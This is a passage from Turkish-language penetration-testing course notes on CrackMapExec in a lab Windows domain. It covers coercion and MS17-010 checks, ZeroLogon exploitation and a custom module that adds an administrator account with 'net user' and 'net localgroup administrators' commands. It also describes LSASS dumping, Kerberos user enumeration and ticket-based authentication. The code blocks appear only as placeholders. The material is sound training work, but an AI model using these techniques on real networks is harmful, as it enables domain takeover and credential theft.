[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

